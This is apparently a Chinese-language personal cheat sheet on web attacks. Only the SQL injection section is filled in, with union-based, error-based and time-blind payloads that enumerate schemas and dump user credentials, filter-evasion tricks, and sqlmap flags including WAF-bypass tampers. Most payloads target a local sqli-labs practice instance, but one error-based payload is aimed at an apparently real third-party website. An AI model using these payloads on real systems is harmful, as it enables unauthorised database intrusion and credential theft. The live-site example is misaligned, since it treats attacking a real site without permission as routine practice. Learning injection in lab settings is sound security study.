## xss


## sql注入

- ### 联合注入
```sql
**有可能不在当前库：
union select 1,schema_name from information_schema.schemata #



http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=2 union select 1,database(),3%23

http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23

http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=2 union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3%23

http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=2 union select 1,(select group_concat(column_name)from information_schema.columns where table_name='users'),3%23

http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=2 union select 1,(select group_concat(username,char(32),password)from users),3%23


#遇到过滤的情况：
空格 ： /**/
关键字过滤 ：一般双写或者替换作用差不多的函数

```

- ### 报错注入
```sql
https://www.starshine.com.tw/news.php?id=1543' and updatexml(1,concat(0x7e,database(),0x7e),1)

?id=1543' and updatexml(1,concat(0x7e,(select mid(table_name,1,10) from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)
```
- ### 时间盲注
```
?id=-1' and if(substr(database(),1,1)='x',sleep(5),1) -- -

```

- ###  布尔盲注

[[sql盲注]]

```
相关函数解析
（1）length：返回值为字符串的字节长度
（2）ascii：把字符转换成ascii码值的函数
（3）substr(str, pos, len)：在str中从pos开始的位置（起始位置为1），截取len个字符
（4）count：统计表中记录的一个函数，返回匹配条件的行数
（5）limit：
limit m ：检索前m行数据，显示1-10行数据（m>0）
limit(x,y)：检索从x+1行开始的y行数据

```
- ### 堆叠注入
![[Pasted image 20231215145107.png]]
- ### sqlmap
```shell

-u：指定含有参数的URL
--dbs：爆出数据库
--batch：默认选择执行
--random-agent：使用随机user-agent
-r：POST注入
--level：注入等级，一共有5个等级（1-5） 不加 level 时，默认是1，5级包含的payload最多，会自动破解出cookie、XFF等头部注入，相对应他的速度也比较慢
--timeout：设定重试超时
--cookie：设置cookie信息
--flush-session：删除指定目标缓存，重新对该目标进行测试
--tamper：使用waf绕过脚本
--time-sec：设定延时时间，默认是5秒
--thread：多线程，默认为1，最大为10
--keep-live： sqlmap默认是一次连接成功后马上关闭；HTTP报文中相当于Connection: Close（一次连接马上关闭）。要扫描站点的URL比较多时，这样比较耗费性能，所以需要将HTTP连接持久化来提高扫描性能；HTTP报文相当于Connection: Keep-Alive
```


## 文件包含


## 文件上传


## csrf


## RCE（一般是可以看源码）

[[19、简单协议和RCE]]

## 代码审计

